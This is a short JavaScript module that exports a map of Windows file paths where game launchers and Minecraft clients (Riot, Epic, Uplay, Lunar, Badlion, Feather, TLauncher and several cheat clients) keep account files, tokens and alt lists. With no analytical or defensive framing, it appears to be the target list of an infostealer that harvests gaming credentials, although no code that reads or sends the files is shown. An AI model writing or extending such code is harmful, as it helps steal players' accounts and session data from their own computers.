const GetGames = () => {
 return {
  NationsGlory: {
   "Local Storage": "AppData\\Roaming\\NationsGlory\\Local Storage\\leveldb",
  },
  "Riot Games": {
   Config: "AppData\\Local\\Riot Games\\Riot Client\\Config",
   Data: "AppData\\Local\\Riot Games\\Riot Client\\Data",
   Logs: "AppData\\Local\\Riot Games\\Riot Client\\Logs",
  },
  "Epic Games": {
   Settings: "AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini",
  },
  Uplay: {
   Settings: "AppData\\Local\\Ubisoft Game Launcher",
  },
  Minecraft: {
   "Microsoft Store": "AppData\\Roaming\\.minecraft\\launcher_accounts_microsoft_store.json",
   CheatBreakers: "AppData\\Roaming\\.minecraft\\cheatbreaker_accounts.json",
   "Rise (Intent)": "intentlauncher\\Rise\\alts.txt",
   TLauncher: "AppData\\Roaming\\.minecraft\\TlauncherProfiles.json",
   Paladium: "AppData\\Roaming\\paladium-group\\accounts.json",
   Novoline: "AppData\\Roaming\\.minecraft\\Novoline\\alts.novo",
   Badlion: "AppData\\Roaming\\Badlion Client\\accounts.json",
   Feather: "AppData\\Roaming\\.feather\\accounts.json",
   Impact: "AppData\\Roaming\\.minecraft\\Impact\\alts.json",
   Meteor: "AppData\\Roaming\\.minecraft\\meteor-client\\accounts.nbt",
   PolyMC: "AppData\\Roaming\\PolyMC\\accounts.json",
   Intent: "intentlauncher\\launcherconfig",
   Lunar: ".lunarclient\\settings\\game\\accounts.json",
   Rise: "AppData\\Roaming\\.minecraft\\Rise\\alts.txt",
  },
 };
};

module.exports = {
 GetGames,
};
